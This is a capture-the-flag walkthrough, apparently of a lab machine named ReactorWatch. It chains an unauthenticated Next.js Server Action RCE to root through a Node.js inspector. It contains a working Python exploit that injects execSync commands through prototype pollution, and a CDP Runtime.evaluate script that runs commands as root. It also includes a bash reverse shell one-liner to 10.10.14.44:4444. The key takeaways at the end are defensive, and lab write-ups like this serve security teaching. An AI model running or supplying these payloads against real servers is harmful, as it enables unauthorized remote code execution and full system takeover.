Machine Overview

ReactorWatch is a Next.js 15.0.3 reactor monitoring dashboard vulnerable to CVE-2025-55182 (React2Shell) — an unauthenticated RCE via prototype pollution in the React Flight deserialization logic of the App Router's Server Actions. Command output is recovered from a redirect header, yielding a shell as node. Post-exploitation uncovers an SQLite database with MD5-hashed credentials, cracking to SSH access as engineer. Root is obtained by connecting to a Node.js V8 inspector (--inspect) running as root, executing arbitrary JavaScript inside the privileged process via the Chrome DevTools Protocol.

◈
Full Attack Chain: Nmap finds port 3000 (Next.js 15.0.3) → CVE-2025-55182 prototype pollution via Server Action multipart POST → command output in x-action-redirect header → RCE as node → SQLite reactor.db exfiltrated → engineer MD5 cracked (reactor1) → SSH as engineer → root Node.js --inspect on :9229 → SSH tunnel → CDP WebSocket Runtime.evaluate → root.

// 03

Vulnerability — CVE-2025-55182 React2Shell

CVE-2025-55182 — React2Shell
Next.js 15.x (App Router — Server Actions)
Root Cause: Prototype pollution in the React Flight deserialization logic. When Next.js processes a Server Action multipart/form-data request, it deserializes an embedded React Flight JSON object. An attacker can craft a payload that:

• Pollutes __proto__.then — making plain objects behave like thenables
• Injects arbitrary JavaScript into _response._prefix — code that executes during Flight response construction
• Forces a NEXT_REDIRECT error whose digest field contains command output
• The output is exposed in the x-action-redirect response header as a URL query parameter

No authentication is required. Any route that processes Server Actions is vulnerable.
⚠
Backtick Caveat: The payload embeds command output inside a JavaScript template literal. Commands or files containing backtick characters (`) break the template literal syntax, causing the Node.js process to crash. Avoid or escape backticks in all executed commands and file reads during exploitation.
// 04

Initial Access — CVE-2025-55182 Exploitation

03
Exploit Payload Construction
RCE · Phase 03

The malicious multipart payload embeds a React Flight JSON object that poisons __proto__.then and injects a child_process.execSync call into _response._prefix. The result is wrapped in a NEXT_REDIRECT error whose digest contains the command output, surfaced in the x-action-redirect header.

python3 — rce exploit core
import requests, re

TARGET = "http://10.129.151.1:3000"
BOUNDARY = "----WebKitFormBoundary7MA4YWxk"

def run_cmd(cmd):
    payload_json = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        f'"var res=process.mainModule.require(\'child_process\')'
        f'.execSync(\'{cmd}\').toString().trim().replace(/\\\\n/g,\' | \');;'
        f'throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
        f'{{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",'
        '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0_0"\r\n\r\n'
        f'{payload_json}\r\n'
        f"--{BOUNDARY}--\r\n"
    )

    resp = requests.post(
        TARGET + "/",
        headers={
            "Next-Action": "x",
            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        },
        data=body.encode(),
        allow_redirects=False
    )

    # Output is in: x-action-redirect: /login?a=CMD_OUTPUT
    redirect = resp.headers.get("x-action-redirect", "")
    match = re.search(r'\?a=(.+?)(?:;|$)', redirect)
    return match.group(1) if match else "(no output)"

# Verify RCE
print(run_cmd("id"))
output — RCE confirmed
uid=999(node) gid=999(node) groups=999(node)
✓
Unauthenticated RCE Confirmed: Command output returned in x-action-redirect header. Running as node (uid=999).

PrivEsc — Node.js V8 Inspector (CDP) as Root

07
Root --inspect Process Discovery
PrivEsc · Phase 07

ps aux reveals a root-owned Node.js process running with --inspect=127.0.0.1:9229. The V8 inspector flag exposes the Chrome DevTools Protocol (CDP) over a WebSocket, allowing a connected client to execute arbitrary JavaScript inside the process — as root.

bash
ps aux | grep inspect
output
root 1416  0.0  1.1 1066816 47512 ? Ssl 15:58
  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
✕
Node.js Inspector = Root Code Execution: The V8 inspector WebSocket accepts Runtime.evaluate messages with arbitrary JavaScript. Since the process runs as root, any code sent to the inspector executes with full root privileges — equivalent to an unrestricted root shell.

09
CDP Runtime.evaluate → Root Shell
PrivEsc · Phase 09

Connect to the WebSocket debugger URL and send a Runtime.evaluate CDP message containing arbitrary Node.js. Since require is not directly available in the debugger context, use process.mainModule.require to access child_process.execSync.

python3 — cdp_exploit.py
import websocket, json

WS_URL = 'ws://127.0.0.1:9229/4474c5b7-dfc7-464d-b664-1f264cf9cf54'
ws = websocket.create_connection(WS_URL)

# Use process.mainModule.require — require() not directly available in CDP context
cmd = "process.mainModule.require('child_process')"
cmd += ".execSync('cat /root/root.txt').toString()"

msg = {
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": cmd,
        "returnByValue": True
    }
}

ws.send(json.dumps(msg))
response = json.loads(ws.recv())
print(response['result']['result']['value'])
ws.close()
◈
Spawn a Root Reverse Shell: Replace the cat command with a bash reverse shell for an interactive session: bash -i >& /dev/tcp/10.10.14.44/4444 0>&1
✓
Root Code Execution via CDP: Runtime.evaluate executes JavaScript as root inside the uptime-monitor worker process. Full filesystem access and command execution as uid=0(root).

key takeaways
// 01
Server Action Deserialization Is a Critical Attack Surface
CVE-2025-55182 demonstrates that React Flight deserialization in Next.js Server Actions can be exploited to pollute prototypes and inject executable code — with zero authentication required. Any route processing a Next-Action multipart request is in scope. Framework updates must be applied immediately and Server Actions should be disabled if not in use.
// 02
MD5 Password Hashing Is Cryptographically Broken
The engineer MD5 hash cracked in seconds against rockyou.txt. MD5 has no computational cost for verification and is trivially brute-forced. All password storage must use adaptive hashing algorithms (bcrypt, Argon2, PBKDF2) with appropriate work factors that keep verification time above 100ms.
// 03
--inspect on a Root Process Is an Instant Root Backdoor
The Node.js V8 inspector flag exposes a WebSocket that accepts arbitrary JavaScript via Runtime.evaluate — with no authentication. Running this on a root process is equivalent to leaving a passwordless root shell listening on a port. The --inspect flag must never be present on production or privileged Node.js processes.
// 04
SSH Tunnelling Bypasses Localhost-Only Restrictions
Binding the inspector to 127.0.0.1 instead of 0.0.0.0 does not protect against an attacker with SSH access to the machine — local port forwarding trivially exposes any localhost service. Network isolation of sensitive interfaces requires firewall rules, not just bind address selection.
// 05
SQLite Databases in Application Directories Are Recoverable
Storing the production user database in the application directory (/opt/reactor-app/reactor.db) meant the file was readable by the node service user. RCE → base64 encode → curl exfiltration is a one-liner. Databases must be stored outside the web root, with restricted filesystem permissions, and sensitive data must be encrypted at rest.
// 06
Least Privilege Must Apply to Every Production Process
Running an uptime monitor as root when it only needs network socket permissions is a textbook violation of the principle of least privilege. Every service must run under a dedicated non-root account with only the capabilities required for its function. Capabilities, systemd DynamicUser=yes, and container isolation provide effective enforcement.
